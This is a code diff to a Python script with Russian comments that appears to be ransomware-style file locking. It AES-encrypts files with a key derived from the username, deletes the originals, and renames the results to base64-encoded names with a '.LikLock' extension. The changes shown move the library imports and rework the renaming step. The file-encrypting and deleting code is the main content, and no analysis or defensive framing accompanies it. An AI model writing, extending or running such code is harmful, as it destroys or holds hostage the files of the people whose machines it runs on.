@@ -5,6 +5,11 @@ import getpass
 import subprocess
 import sys
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+from tqdm import tqdm
+import pyfiglet
+from termcolor import colored
 
 # Функция для установки необходимых пакетов
 def install(package):
@@ -21,13 +26,6 @@ def check_and_install(package):
 required_packages = ['pycryptodome', 'tqdm', 'pyfiglet', 'termcolor']
 for package in required_packages:
     check_and_install(package)
-
-# Импортируем библиотеки после их установки
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad
-from tqdm import tqdm
-import pyfiglet
-from termcolor import colored
 
 def generate_key():
     username = getpass.getuser()
@@ -55,9 +53,10 @@ def encrypt_file(file_path, key):
     # Удаляем оригинальный файл после шифрования
     os.remove(file_path)
     
-    # Переименовываем зашифрованный файл
-    base64_encoded_name = base64.b64encode(os.path.basename(file_path).encode()).decode()
-    os.rename(encrypted_file_path, os.path.join(os.path.dirname(file_path), base64_encoded_name + '.LikLock'))
+    # Переименовываем зашифрованный файл с учетом расширения
+    full_file_name = os.path.basename(file_path)  # Получаем полное имя файла
+    full_encoded_name = base64.b64encode(full_file_name.encode()).decode()  # Кодируем полное имя в base64
+    os.rename(encrypted_file_path, os.path.join(os.path.dirname(file_path), full_encoded_name + '.LikLock'))
     
     return True
 
